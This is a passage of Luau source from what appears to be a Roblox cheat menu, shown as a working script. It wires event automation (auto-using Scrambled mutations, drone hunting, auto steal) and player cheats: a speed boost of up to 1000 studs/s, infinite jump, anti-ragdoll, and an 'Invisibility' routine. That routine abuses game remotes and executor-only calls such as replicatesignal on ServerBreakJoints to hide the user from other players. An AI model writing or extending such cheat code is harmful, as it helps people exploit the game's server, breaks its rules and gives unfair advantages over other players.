			tbl21.RarityColor = "#C7CBD6"
			tbl21.Icon = ""
			tbl21.Cooldown = os.clock() + (arg or 5)
		end

		local function fn56(arg)
			if tbl4.Movement.ScrambleWanted == true or tbl4.Steal.Wanted == true then
				tbl21.State = "work"
				tbl21.Status = tbl4.Movement.ScrambleWanted == true and "Drone hunt goes first" or "Auto Steal goes first"
				tbl21.Cooldown = os.clock() + 2
				return
			end

			local cooldown = tbl21.Cooldown
			if os.clock() < cooldown then
				return
			end
			local v12, v13 = fn46()

			if not v12 then
				pcall(fn48)
				if fn47() then
					tbl21.Cooldown = os.clock() + 0.5
					return
				end

				if tbl21.Short then
					tbl21.Idle("Out of Samples, waiting for more", "Hunt drones to earn Samples", 10)
					return
				end

				if not string.find(tbl21.Status, "Samples", 1, true) then
					tbl21.Status = "Need a Scrambled consumable"
				end

				tbl21.Idle(tbl21.Status, "Buy Scrambled from the event shop", 5)
				return
			end

			tbl21.Left = v13
			local v14 = fn48()

			if not v14 or not v14.Uid then
				tbl21.State = "stop"
				tbl21.Status = "Waiting"
				fn55(nil)
				return
			end

			if tbl4.Movement.PlaceWanted == true then
				tbl21.State = "work"
				tbl21.Status = "Auto Place goes first"
				tbl21.Cooldown = os.clock() + 2
				return
			end

			if not tbl4.ClaimMovement("mutation") then
				tbl21.State = "work"
				tbl21.Status = "Waiting for " .. tostring(tbl4.Movement.Owner or "movement")
				tbl21.Cooldown = os.clock() + 2
				return
			end

			tbl4.Movement.MutationWanted = true

			local ok, result = pcall(function()
				while not tbl21.Over(arg) do
					local v15, v16 = fn46()

					if v15 then
						tbl21.Left = v16
						local v17 = fn48()

						if not v17 or not v17.Uid then
							tbl21.State = "stop"
							tbl21.Status = "Waiting"
							fn55(nil)
							break
						else
							if v17.Uid ~= tbl21.Locked then
								tbl21.Locked = v17.Uid
								tbl21.Status = "New target picked"
							end

							fn55(v17)

							if not fn44(v17, arg) then
								tbl21.State = "work"
								tbl21.Status = "Could not reach the egg"
								tbl21.Cooldown = os.clock() + 3
								break
							elseif not tbl21.Over(arg) then
								if tbl21.Apply(v17, v15) then
									pcall(fn54)
									task.wait(0.35)
									continue
								end
							end
						end
					end

					break
				end
			end)

			if not ok then
				tbl21.Status = "Stopped: " .. tostring(result)
				tbl21.State = "work"
				tbl21.Cooldown = os.clock() + 3
			end

			tbl21.Settle()
			tbl4.Movement.MutationWanted = false
			tbl4.ReleaseMovement("mutation")
		end

		tbl21.Handle = v6:CreateToggle({
			Name = "Auto Use Scrambled Mutation",
			Default = false,
			Callback = function(arg)
				tbl21.Loop = tbl21.Loop + 1
				tbl4.Movement.MutationWanted = false
				tbl4.ReleaseMovement("mutation")
				if arg ~= true then
					return
				end
				local loop = tbl21.Loop

				task.spawn(function()
					while loop == tbl21.Loop and tbl4.Toggle(tbl21.Handle, false) do
						pcall(fn56, loop)
						pcall(fn54)
						task.wait(tbl21.State == "idle" and 3 or 1)
					end
				end)
			end,
		})

		if type(v6.CreateCanvas) == "function" then
			local v12 = v6:CreateCanvas({
				Name = "Scrambled Status",
				ShowTitle = false,
				Layout = "free",
				SubOf = tbl21.Handle,
				Style = {
					TextScale = 1,
					LineHeight = 1.1,
					MinLines = 4,
					MaxLines = 4,
					AutoHeight = true,
					BackgroundTransparency = 0.35,
					TextColor = Color3.fromRGB(255, 255, 255),
					TextStrokeTransparency = 0.7,
				},
				Build = function(arg)
					tbl21.Ui.Card = arg:Frame({
						X = 0,
						Y = 0,
						Width = 1,
						Height = 3.6,
						Corner = 0.3,
						Background = "#151821",
						BackgroundTransparency = 0.25,
					})

					tbl21.Ui.Accent = arg:Frame({
						Parent = tbl21.Ui.Card,
						X = 0.08,
						Y = 0.18,
						Width = 0.16,
						Height = 3.24,
						Corner = 0.2,
						Background = tbl20.idle,
					})

					tbl21.Ui.Icon = arg:Image({
						Parent = tbl21.Ui.Card,
						X = 0.42,
						Y = 0.3,
						Width = 3,
						Height = 3,
						Corner = 0.3,
						Background = "#242938",
						BackgroundTransparency = 0.1,
						StrokeThickness = 0.06,
						StrokeTransparency = 0,
						Visible = false,
					})

					tbl21.Ui.Title = arg:Text({
						Parent = tbl21.Ui.Card,
						X = 3.7,
						Y = 0.32,
						Width = 1,
						Height = 1.05,
						Scale = 1.16,
						Wrap = false,
						Text = tbl21.Status,
						Color = tbl20.idle,
						TextStrokeTransparency = 1,
					})

					tbl21.Ui.Egg = arg:Text({
						Parent = tbl21.Ui.Card,
						X = 3.7,
						Y = 1.42,
						Width = 1,
						Height = 1,
						Scale = 1,
						Wrap = false,
						Text = tbl21.Detail,
						Color = "#FFFFFF",
						TextStrokeTransparency = 1,
					})

					tbl21.Ui.Meta = arg:Text({
						Parent = tbl21.Ui.Card,
						X = 3.7,
						Y = 2.42,
						Width = 1,
						Height = 0.9,
						Scale = 0.86,
						Wrap = false,
						Text = "Charges 0  Eggs 0/0  Tries 0  Applied 0",
						Color = "#AEB4C6",
						TextStrokeTransparency = 1,
					})

					fn54()
				end,
			})

			fn4(function()
				pcall(function()
					v12:Destroy()
				end)
			end)
		else
			tbl21.Row = v6:CreateText({ Name = "Scrambled Status", Text = "Idle", SubOf = tbl21.Handle })
		end

		v6:CreateDropdown({
			Name = "Mutation Min Rarity",
			Note = "Only eggs of this rarity and above are used",
			Options = tbl8,
			Default = tbl8[1],
			SubOf = tbl21.Handle,
			Callback = function(arg)
				tbl21.MinRarity = tbl9[arg] or 0
			end,
		})

		local tbl23 = {
			["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
			["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
			["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
		}

		local tbl24 = { Slider = nil, Value = 0, Unit = "M/s" }

		local function fn57(arg, arg2)
			if arg ~= nil then
				tbl24.Value = math.max(0, math.floor(tonumber(arg) or tbl24.Value))
			end

			if arg2 ~= nil then
				tbl24.Unit = tostring(arg2)
			end

			tbl21.MinIncome = tbl24.Value * (tbl23[tbl24.Unit] or tbl23["M/s"]).Mult
		end

		tbl24.Slider = fn5(v6, {
			Name = "Min Mutation Value",
			Note = "Skip eggs worth less than this (0 = off)",
			SubOf = tbl21.Handle,
			Legacy = "Mutation Min Value",
			SectionName = "Dr Scramble Event",
			OnRaw = function(arg)
				fn57(math.floor(arg / 1000), "K/s")
			end,
		})

		v6:CreateDropdown({
			Name = "Mutation Priority",
			Note = "Which egg gets the consumable first",
			Options = tbl19,
			Default = tbl19[1],
			SubOf = tbl21.Handle,
			Callback = function(arg)
				tbl21.Priority = tostring(arg)
			end,
		})

		fn6(v6:CreateMultiDropdown({
			Name = "Mutation Target Eggs",
			Note = "Only use the consumable on these eggs (empty = all)",
			Options = tbl21.EggOptions,
			Default = {},
			SubOf = tbl21.Handle,
			Callback = function(arg)
				local targets = {}

				if type(arg) == "table" then
					for k, v12 in pairs(arg) do
						k = v12 == true and type(k) == "string" and k or type(v12) == "string" and v12 or nil

						if k and tbl21.EggCategory[k] then
							targets[tbl21.EggCategory[k]] = true
						end
					end
				end

				tbl21.Targets = targets
			end,
		}))

		tbl21.BuyHandle = v6:CreateToggle({
			Name = "Auto Buy Scrambled",
			Note = "Buy another Scrambled from the event shop when you run out",
			Default = false,
			SubOf = tbl21.Handle,
			Callback = function()
				tbl21.Cooldown = 0
			end,
		})

		fn4(function()
			tbl21.Loop = tbl21.Loop + 1
			tbl4.Movement.MutationWanted = false
			tbl4.ReleaseMovement("mutation")
		end)
	end

	do
		local n15 = nil
		local flag4 = false
		local flag5 = false

		tbl3.Add(function()
			if not flag5 and os.clock() - n5 >= n then
				flag5 = true

				task.spawn(function()
					pcall(fn9, true)
					flag5 = false
				end)
			end

			local flag6 = nil

			if v8 then
				flag6 = type(v8.Set) == "function"
			end

			if flag6 then
				pcall(v8.Set, nil, fn15())
			end

			local flag7 = nil

			if v10 then
				flag7 = type(v10.Set) == "function"
			end

			if flag7 then
				pcall(v10.Set, nil, fn33())
			end

			local v11 = fn12()
			local v12 = tbl4.IsNight()

			if v11 and not flag4 then
				tbl16.Latch = v12
				tbl16.Ended = false
			end

			if not v12 then
				tbl16.Latch = false
			elseif v11 and not tbl16.Latch and not tbl16.Ended then
				tbl16.Ended = true
				str = "Night arrived, this outbreak is over"
				table.clear(tbl12)
				table.clear(tbl13)
			end

			if not v11 then
				tbl16.Ended = false
			end

			if flag4 and not v11 then
				task.delay(15, function()
					if not fn12() then
						table.clear(tbl12)
						table.clear(tbl18)
					end
				end)
			end

			flag4 = v11

			if tbl4.Toggle(nil, false) and not flag3 and os.clock() >= n9 and fn11() then
				flag3 = true
				n9 = os.clock() + 8

				task.spawn(function()
					pcall(fn31, function()
						return not tbl4.Toggle(nil, false)
					end)

					flag3 = false
				end)
			end

			local v13 = fn34()
			local v14 = fn35()
			tbl4.Movement.ScrambleWanted = v13 or v14
			local invisibilityHandle = tbl4.InvisibilityHandle
			local flag8 = invisibilityHandle ~= nil and tbl4.Toggle(invisibilityHandle, false)

			if v13 then
				n15 = nil

				if not tbl4.InvisSuspended then
					tbl4.InvisSuspended = true
					flag8 = flag8 and type(v.Notify) == "function"

					if flag8 then
						pcall(v.Notify, "Invisibility", "Invisibility is paused for the drone hunt and comes back after it.", 5)
					end
				end
			elseif tbl4.InvisSuspended and not flag then
				n15 = n15 or os.clock() + 5

				if n15 <= os.clock() then
					n15 = nil
					tbl4.InvisSuspended = false

					if flag8 and type(v.Notify) == "function" then
						pcall(v.Notify, "Invisibility", "The drone hunt is over, Invisibility is back on.", 5)
					end
				end
			end

			local character = localPlayer.Character
			if v13 and not flag and character and character:GetAttribute("InvisApplied") == true then
				str = "Leaving Invisibility for the hunt"
				return true
			end

			if flag then
				return v13
			end

			if not (v13 or v14) or os.clock() < n7 then
				if not v13 and not v14 then
					str = ""
				end

				return false
			end

			local steal = tbl4.Steal
			if steal.Active or steal.Carrying or steal.Wanted then
				str = "Auto Steal goes first"
				return v13
			end

			if not tbl4.ClaimMovement("scramble") then
				str = "Waiting for " .. tostring(tbl4.Movement.Owner or "movement") .. " to finish"
				return v13
			end
			flag = true
			n7 = os.clock() + n2
			local v15 = n6

			task.spawn(function()
				pcall(fn37, function()
					return v15 ~= n6
				end)

				tbl4.HoldBelt()
				pcall(fn36, v15)
				fn32()
				tbl4.ReleaseBelt()
				tbl4.ReleaseMovement("scramble")
				flag = false
				tbl3.Wake()
			end)

			return v13
		end)
	end

	fn4(function()
		n6 += 1
		fn32()
		tbl4.InvisSuspended = false
		tbl4.Movement.ScrambleWanted = false
		tbl4.ReleaseMovement("scramble")
	end)

	local v11, v12

	do
		local v13 = v2:CreateTab({ Name = "Player", SectionsExpanded = true })
		tbl4.EspSection = v13:CreateSection({ Name = "ESP", Expanded = false })
		local v14 = v13:CreateSection({ Name = "Movement", Expanded = true })
		v11 = v13:CreateSection({ Name = "Character", Expanded = true })
		v12 = v13:CreateSection({ Name = "Combat", Expanded = true })
		local createToggle = nil
		local n15 = 350
		local connection = nil
		local flag4 = false

		local function fn38()
			local character = localPlayer.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			character = character and character:FindFirstChildOfClass("Humanoid")
			if humanoidRootPart and character and character.Health > 0 then
				return humanoidRootPart, character
			end
			return nil, nil
		end

		local function fn39()
			if not flag4 then
				return
			end
			flag4 = false
			local v15, v16 = fn38()
			if not v15 then
				return
			end
			local assemblyLinearVelocity = v15.AssemblyLinearVelocity
			local moveDirection = v16.MoveDirection
			local vector = Vector3.new(moveDirection.X, 0, moveDirection.Z)
			local vector2 = vector.Magnitude > 0.001 and vector.Unit * v16.WalkSpeed or Vector3.zero

			pcall(function()
				v15.AssemblyLinearVelocity = Vector3.new(vector2.X, assemblyLinearVelocity.Y, vector2.Z)
			end)
		end

		local function fn40()
			if connection then
				connection:Disconnect()
				connection = nil
			end

			fn39()
			tbl4.Shield("speed", false)
		end

		local function fn41()
			if connection then
				return
			end
			tbl4.Shield("speed", true)

			connection = RunService.Heartbeat:Connect(function()
				if tbl4.Steal.Active or tbl4.Flying or tbl4.Driving > 0 or tbl4.Treadmill.Riding then
					flag4 = false
					return
				end
				local v15, v16 = fn38()
				if not v15 or v16.Sit or v16.PlatformStand then
					flag4 = false
					return
				end
				local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
				if num and num > workspace:GetServerTimeNow() then
					flag4 = false
					return
				end
				local moveDirection = v16.MoveDirection
				local vector = Vector3.new(moveDirection.X, 0, moveDirection.Z)
				if vector.Magnitude <= 0.001 then
					fn39()
					return
				end
				local n16 = vector.Unit * n15
				local assemblyLinearVelocity = v15.AssemblyLinearVelocity

				pcall(function()
					v15.AssemblyLinearVelocity = Vector3.new(n16.X, assemblyLinearVelocity.Y, n16.Z)
				end)

				flag4 = true
			end)
		end

		tbl4.SpeedForced = false

		local function fn42()
			if tbl4.Toggle(createToggle, false) or tbl4.SpeedForced then
				fn41()
			else
				fn40()
			end
		end

		local flag5 = false
		local flag6 = false
		local flag7 = false

		tbl4.SetSpeedForced = function(arg)
			tbl4.SpeedForced = arg == true
			flag5 = true
			fn42()
		end

		local tbl19 = {
			Name = "Speed Boost",
			Default = false,
			Callback = function()
				if tbl4.SpeedForced and not tbl4.Toggle(createToggle, false) then
					flag5 = true
					flag7 = true
				end

				fn42()
			end,
		}

		createToggle = v14.CreateToggle
		createToggle = createToggle(v14, tbl19)

		local connection2 = RunService.Heartbeat:Connect(function()
			if flag7 then
				flag7 = false

				if type(v.Notify) == "function" then
					pcall(v.Notify, "Speed Boost", "Speed Boost must stay on while Invisibility is on.", 5)
				end
			end

			if not flag5 then
				return
			end
			flag5 = false
			local flag8

			if tbl4.SpeedForced and not tbl4.Toggle(createToggle, false) then
				flag6 = true
				flag8 = true
			else
				local flag9 = not tbl4.SpeedForced and flag6
				flag8 = nil

				if flag9 then
					flag6 = false
					flag8 = nil

					if tbl4.Toggle(createToggle, false) then
						flag8 = false
					end
				end
			end

			if flag8 ~= nil then
				for _, v15 in ipairs({ "Set", "SetValue" }) do
					local ok, result = pcall(function()
						return createToggle[v15]
					end)

					if not (ok and type(result) == "function" and pcall(result, createToggle, flag8)) then
						continue
					end
					break
				end
			end
		end)

		fn4(function()
			connection2:Disconnect()
		end)

		v14:CreateSlider({
			Name = "Boost Speed",
			Min = 20,
			Max = 1000,
			Default = 350,
			Increment = 5,
			Unit = "studs/s",
			Callback = function(arg)
				n15 = math.clamp(tonumber(arg) or 350, 20, 1000)
			end,
		})

		fn4(fn40)
		local v15 = nil
		local connection3 = nil

		local function fn43()
			if connection3 then
				connection3:Disconnect()
				connection3 = nil
			end

			tbl4.Shield("jump", false)
		end

		v15 = v14:CreateToggle({
			Name = "Infinite Jump",
			Default = false,
			Callback = function()
				if not tbl4.Toggle(v15, false) then
					fn43()
					return
				end

				if connection3 then
					return
				end
				tbl4.Shield("jump", true)

				connection3 = UserInputService.JumpRequest:Connect(function()
					local character = localPlayer.Character
					local humanoid = character and character:FindFirstChildOfClass("Humanoid")

					if humanoid then
						pcall(function()
							humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
						end)
					end
				end)
			end,
		})

		fn4(fn43)
	end

	do
		local v13 = nil
		local flag4 = false
		local flag5 = true
		local flag6 = false
		local flag7 = false
		local flag8 = false
		local v14 = nil
		local v15 = nil
		local hipHeight = 999

		local function fn38()
			return flag4 and not tbl4.InvisSuspended
		end

		local function fn39(arg)
			return arg and arg:FindFirstChildOfClass("Humanoid") or nil
		end

		local function fn40(arg)
			return networking:FindFirstChild(arg)
		end

		local function fn41(arg)
			return arg ~= nil and arg:GetAttribute("InvisApplied") == true
		end

		local function fn42()
			local AskDoff = fn40("RF/Treadmill/AskDoff")

			if AskDoff and AskDoff:IsA("RemoteFunction") then
				for i = 1, 2 do
					pcall(AskDoff.InvokeServer, AskDoff)
				end
			end
		end

		local function fn43(arg)
			local AskRigWipe = fn40("RE/RigSync/AskRigWipe")

			if AskRigWipe and AskRigWipe:IsA("RemoteEvent") then
				pcall(AskRigWipe.FireServer, AskRigWipe, arg)
			end
		end

		local function fn44(arg)
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")

			for _, child in ipairs(arg:GetChildren()) do
				if child:IsA("Humanoid") then
					pcall(child.UnequipTools, child)
				end
			end

			if backpack then
				for _, child in ipairs(arg:GetChildren()) do
					if child:IsA("Tool") then
						pcall(function()
							child.Parent = backpack
						end)
					end
				end
			end

			for i = 1, 3 do
				RunService.Heartbeat:Wait()
			end
		end

		local function fn45(arg)
			local v16 = fn39(arg)
			if not arg or not v16 then
				return false
			end
			fn44(arg)
			fn42()

			pcall(function()
				v16:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
				v16.BreakJointsOnDeath = true
				v16.RequiresNeck = true
				v16.Health = 0
			end)

			pcall(function()
				v16:ChangeState(Enum.HumanoidStateType.Dead)
			end)

			pcall(function()
				arg:BreakJoints()
			end)

			fn43(arg)
			return true
		end

		local function fn46(parent)
			local v16 = fn39(parent)
			local n15 = os.clock() + 10

			while true do
				if os.clock() < n15 and flag5 and parent.Parent then
					v16 = v16 or fn39(parent)
					if not (v16 and parent:FindFirstChild("HumanoidRootPart") and parent:FindFirstChild("Head")) then
						task.wait()
						continue
					end
				end

				break
			end

			local humanoidRootPart = parent:FindFirstChild("HumanoidRootPart")
			if not fn38() or not v16 or not humanoidRootPart or not parent:FindFirstChild("Head") then
				return false
			end
			task.wait(0.05)
			if not fn38() or parent.Parent == nil then
				return false
			end

			for i = 1, 2 do
				pcall(v16.UnequipTools, v16)
			end

			if type(replicatesignal) == "function" then
				for i = 1, 2 do
					pcall(replicatesignal, v16.ServerBreakJoints)
				end
			end

			local hipHeight2 = v16.HipHeight

			pcall(function()
				v16.HipHeight = hipHeight
			end)

			for _, child in ipairs(parent:GetChildren()) do
				if child:IsA("Accessory") or child:IsA("BasePart") and child ~= humanoidRootPart then
					pcall(function()
						child.Parent = nil
					end)
				end
			end

			task.wait(0.12)

			local function fn47()
				pcall(function()
					v16.HipHeight = hipHeight2
				end)

				for _, child in ipairs(parent:GetChildren()) do
					if child:IsA("Humanoid") and child.HipHeight ~= hipHeight2 then
						pcall(function()
							child.HipHeight = hipHeight2
						end)
					end
				end
			end

			if parent.Parent == nil then
				fn47()
				return false
			end
			local motor6D = Instance.new("Motor6D")
			motor6D.Name = "RightWrist"
			motor6D.C0 = CFrame.new(1.2, 0, 0)
			motor6D.C1 = CFrame.new()
			motor6D.Part0 = humanoidRootPart
			motor6D.Parent = humanoidRootPart
			local part = Instance.new("Part")
			part.Name = "RightHand"
			part.Size = Vector3.new(0.2, 0.2, 0.2)
			part.Transparency = 1
			part.CanCollide = false
			part.CanTouch = false
			part.CanQuery = false
			part.Massless = true
			part.CFrame = humanoidRootPart.CFrame * motor6D.C0
			motor6D.Part1 = part
			part.Parent = parent

			pcall(function()
				humanoidRootPart.CanCollide = false
			end)

			fn47()
			parent:SetAttribute("InvisApplied", true)

			task.delay(1, function()
				local chilliToolKeeper = (typeof(getgenv) == "function" and getgenv() or _G).ChilliToolKeeper

				if parent.Parent and type(chilliToolKeeper) == "function" then
					pcall(chilliToolKeeper)
				end
			end)

			task.delay(0.2, function()
				if humanoidRootPart.Parent then
					pcall(function()
						humanoidRootPart.CanCollide = true
					end)
				end
			end)

			local connection = parent.ChildAdded:Connect(function(child)
				if child:IsA("Humanoid") then
					task.defer(function()
						if child.HipHeight ~= hipHeight2 then
							pcall(function()
								child.HipHeight = hipHeight2
							end)
						end
					end)
				end
			end)

			local connection2 = nil

			connection2 = parent.AncestryChanged:Connect(function(child, parent2)
				if parent2 == nil then
					connection:Disconnect()
					connection2:Disconnect()
				end
			end)

			return true
		end

		local function fn47()
			local active = tbl4.Steal.Active or tbl4.Steal.Carrying or tbl4.Flying

			if not active then
				active = (tbl4.Driving or 0) > 0
			end

			return active
		end

		tbl4.RequestRespawn = function()
			flag8 = true
		end

		local function fn48()
			flag6 = true
			local v16 = flag8

			while flag5 and (fn47() or not tbl4.ClaimMovement("invisibility")) do
				task.wait(0.2)
			end

			local character = localPlayer.Character

			if flag5 and character and (v16 or fn41(character) ~= fn38()) and fn39(character) then
				flag8 = false
				tbl7.Paused = true
				tbl4.ShieldPaused = true
				pcall(tbl4.UndoSwap)
				task.wait()
				fn45(localPlayer.Character)
				local n15 = os.clock() + 60
				local n16 = os.clock() + 8

				while flag5 and os.clock() < n15 and localPlayer.Character == character do
					if n16 <= os.clock() then
						n16 = os.clock() + 8
						fn43(character)
					end

					task.wait(0.05)
				end

				task.wait(0.1)

				while flag5 and flag7 do
					task.wait(0.05)
				end
			end

			tbl7.Paused = false
			tbl4.ShieldPaused = false
			tbl4.ReleaseMovement("invisibility")
			flag6 = false
		end

		local connection = localPlayer.CharacterAdded:Connect(function(character)
			if not fn38() then
				return
			end
			flag7 = true
			tbl4.ShieldPaused = true

			task.spawn(function()
				pcall(fn46, character)
				flag7 = false

				if not flag6 then
					tbl4.ShieldPaused = false
				end
			end)
		end)

		local thread = task.spawn(function()
			while flag5 do
				local character = localPlayer.Character
				local v16 = fn39(character)

				if not flag6 and not flag7 and character and v16 and v16.Health > 0 and (flag8 or fn41(character) ~= fn38()) then
					fn48()
				end

				local v17 = fn41(localPlayer.Character)

				if v17 ~= v14 then
					v14 = v17
					tbl4.SetSpeedForced(v17)
				end

				task.wait(0.25)
			end
		end)

		local connection2 = RunService.Heartbeat:Connect(function()
			local character = localPlayer.Character
			if not character or not fn41(character) then
				return
			end
			local rightHand = character:FindFirstChild("RightHand")
			local tool = character:FindFirstChildWhichIsA("Tool")
			local handle = tool and tool:FindFirstChild("Handle")
			if not rightHand or not handle or not handle:IsA("BasePart") then
				return
			end
			local cframe = CFrame.new()

			for _, child in ipairs(rightHand:GetChildren()) do
				if child:IsA("JointInstance") and child.Name == "RightGrip" and child.Part1 == handle then
					cframe = child.C0 * child.C1:Inverse()

					if child.Enabled then
						child.Enabled = false
					end
				end
			end

			pcall(function()
				handle.CFrame = rightHand.CFrame * cframe
				handle.AssemblyLinearVelocity = Vector3.zero
				handle.AssemblyAngularVelocity = Vector3.zero
			end)
		end)

		fn4(function()
			connection2:Disconnect()
		end)

		local connection3 = RunService.Heartbeat:Connect(function()
			local character = localPlayer.Character
			local v16 = fn39(character)
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			if not v16 or not humanoidRootPart or v16.Health <= 0 then
				return
			end
			local flag9 = fn41(character) and not tbl4.Steal.Active and not tbl4.Flying

			if flag9 then
				flag9 = (tbl4.Driving or 0) == 0
			end

			if flag9 then
				flag9 = not (tbl4.Treadmill and tbl4.Treadmill.Riding)
			end

			if not (flag9 and not v16.Sit and not v16.PlatformStand) then
				if v15 == v16 then
					v15 = nil

					pcall(function()
						v16.AutoRotate = true
					end)
				end

				return
			end

			if v16.AutoRotate then
				pcall(function()
					v16.AutoRotate = false
				end)
			end

			v15 = v16
			local moveDirection = v16.MoveDirection
			local vector = Vector3.new(moveDirection.X, 0, moveDirection.Z)

			if vector.Magnitude > 0.01 then
				pcall(function()
					humanoidRootPart.CFrame = CFrame.lookAt(humanoidRootPart.Position, humanoidRootPart.Position + vector.Unit)
				end)
			end
		end)

		tbl4.InvisibilityHandle = v11:CreateToggle({
			Name = "Invisibility",
			Note = "Makes you invisible to other players",
			Default = false,
			Callback = function()
				local str3 = nil

				if type(tbl4.CombatActive) == "function" and tbl4.CombatActive() then
					str3 = "Auto Hit"
				end

				if tbl4.Toggle(v13, false) and str3 then
					flag4 = false
					local v16 = v13

					tbl4.UiDefer(function()
						pcall(v16.Set, v16, false, false)
						tbl4.Notify("Invisibility", "Turn off " .. str3 .. " first, both cannot be on at the same time")
					end)

					return
				end

				flag4 = tbl4.Toggle(v13, false) == true

				if fn38() and not fn41(localPlayer.Character) and tbl4.Movement.Owner == nil then
					tbl4.Movement.Owner = "invisibility"
				end
			end,
		})

		fn4(function()
			flag5 = false
			connection:Disconnect()
			connection3:Disconnect()
			pcall(task.cancel, thread)
			tbl7.Paused = false
			tbl4.ShieldPaused = false
			tbl4.ReleaseMovement("invisibility")
		end)
	end

	do
		local tbl19 = { BallSocketConstraint = true, NoCollisionConstraint = true, HingeConstraint = true }

		local tbl20 = {
			[Enum.HumanoidStateType.Physics] = true,
			[Enum.HumanoidStateType.Ragdoll] = true,
			[Enum.HumanoidStateType.FallingDown] = true,
		}

		local n15 = 0.5
		local n16 = 5
		local n17 = 0

		local v13 = fn2(function()
			return ReplicatedStorage.Shared.Modules.Ragdoll
		end)

		local v14 = nil

		local function fn38()
			if v14 then
				return v14
			end

			local ok, result = pcall(function()
				return require(localPlayer:WaitForChild("PlayerScripts", 5):WaitForChild("PlayerModule", 5)):GetControls()
			end)

			if ok then
				v14 = result
			end

			return v14
		end

		local createToggle = nil
		local flag4 = false
		local connection = nil
		local n18 = 0
		local fn39 = nil
		local tbl21 = {}
		local tbl22 = {}
		local n19 = 0
		local v15 = nil
		local humanoid = nil

		local function fn40(arg)
			for _, v16 in ipairs(arg) do
				if v16.Connected then
					v16:Disconnect()
				end
			end

			table.clear(arg)
		end

		local function fn41(arg)
			tbl21[#tbl21 + 1] = arg
		end

		local function fn42(arg)
			tbl22[#tbl22 + 1] = arg
		end

		local function fn43()
			if not v15 or not humanoid then
				return
			end
			local humanoidRootPart = v15:FindFirstChild("HumanoidRootPart")
			if not humanoidRootPart then
				return
			end
			local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
			local vector = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
			local n20 = humanoid.WalkSpeed + n16
			local y = assemblyLinearVelocity.Y
			local flag5 = false

			if n20 < vector.Magnitude then
				vector = vector.Unit * n20
				flag5 = true
			end

			if n17 < y then
				y = n17
				flag5 = true
			end

			if flag5 then
				pcall(function()
					humanoidRootPart.AssemblyLinearVelocity = Vector3.new(vector.X, y, vector.Z)
				end)
			end
		end

		local function fn44()
			if type(v13) ~= "table" then
				return
			end

			if type(v13.ClearClientRagdoll) == "function" then
				pcall(v13.ClearClientRagdoll)
			end

			if type(v13.Unragdoll) == "function" then
				pcall(v13.Unragdoll, v15)
			end
		end

		local function fn45()
			if not v15 or not v15.Parent then
				return
			end

			for _, descendant in ipairs(v15:GetDescendants()) do
				if tbl19[descendant.ClassName] then
					pcall(function()
						descendant:Destroy()
					end)
				end
			end
		end

		local function fn46()
			if not v15 or not v15.Parent then
				return
			end

			for _, descendant in ipairs(v15:GetDescendants()) do
				if descendant:IsA("Motor6D") and not descendant.Enabled then
					pcall(function()
						descendant.Enabled = true
					end)
				elseif descendant:IsA("AnimationConstraint") and not descendant.Enabled then
					pcall(function()
						descendant.Enabled = true
					end)
				end
			end
		end

		local function fn47()
			local v16 = fn38()

			if v16 and v16.controlsEnabled == false then
				pcall(function()
					v16:Enable()
				end)
			end
		end

		local function fn48()
			local currentCamera = workspace.CurrentCamera

			if currentCamera and humanoid and currentCamera.CameraSubject ~= humanoid then
				pcall(function()
					currentCamera.CameraSubject = humanoid
				end)
			end
		end

		local function fn49()
			if not humanoid or not humanoid.Parent or humanoid.Health <= 0 then
				return
			end

			if tbl20[humanoid:GetState()] then
				pcall(function()
					humanoid:ChangeState(Enum.HumanoidStateType.Running)
				end)
			end

			if humanoid.PlatformStand then
				humanoid.PlatformStand = false
			end
		end

		local function fn50()
			if type(v13) == "table" and type(v13.IsRagdolled) == "function" then
				local ok, result = pcall(v13.IsRagdolled, v15)
				if ok and result == true then
					return true
				end
			end

			local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
			return num ~= nil and num > workspace:GetServerTimeNow()
		end

		local n20 = 21

		local function fn51()
			if tbl4.AntiGuard.Busy == true then
				return true
			end

			if (tonumber(tbl4.AntiGuard.HitArms) or 0) <= 0 then
				return false
			end
			return os.clock() - (tonumber(tbl4.AntiGuard.HitArmedAt) or 0) <= n20
		end

		local function fn52()
			if not humanoid or not humanoid.Parent then
				return false
			end

			if humanoid.PlatformStand then
				return true
			end
			return tbl20[humanoid:GetState()] == true
		end

		local function fn53()
			if not v15 or not v15.Parent then
				return false
			end

			for _, child in ipairs(v15:GetChildren()) do
				if tbl19[child.ClassName] then
					return true
				end

				if child:IsA("BasePart") then
					for _, child2 in ipairs(child:GetChildren()) do
						if tbl19[child2.ClassName] then
							return true
						end
					end
				end
			end

			return false
		end

		local function fn54()
			fn43()
			fn44()
			fn45()
			fn46()
			fn49()
			fn47()
			fn48()
		end

		local function fn55()
			if not flag4 or fn51() then
				return
			end
			n18 = os.clock() + n15
		end

		local function fn56()
			local character = localPlayer.Character

			if character ~= v15 then
				if character then
					fn39(character)
				else
					n19 += 1
					fn40(tbl22)
					v15 = nil
					humanoid = nil
				end

				return
			end

			if not v15 then
				return
			end

			if v15:FindFirstChildOfClass("Humanoid") ~= humanoid then
				fn39(v15)
			end
		end

		local function fn57()
			if not flag4 then
				return
			end
			fn56()
			if not v15 or not humanoid or humanoid.Health <= 0 then
				return
			end

			if fn51() then
				n18 = 0
				return
			end
			local now = os.clock()

			if fn52() or fn50() or fn53() then
				n18 = now + n15
			end

			if now <= n18 then
				fn54()
			end
		end

		fn39 = function(arg)
			n19 += 1
			local v16 = n19
			fn40(tbl22)
			v15 = arg
			humanoid = nil
			if not flag4 or not arg then
				return
			end
			humanoid = arg:FindFirstChildOfClass("Humanoid")
			if not flag4 or n19 ~= v16 or arg ~= localPlayer.Character or not humanoid or not humanoid:IsA("Humanoid") then
				return
			end

			fn42(humanoid.StateChanged:Connect(function(old, new)
				if flag4 and tbl20[new] then
					fn55()
				end
			end))

			fn42(humanoid:GetPropertyChangedSignal("PlatformStand"):Connect(function()
				if flag4 and humanoid and humanoid.PlatformStand then
					fn55()
				end
			end))

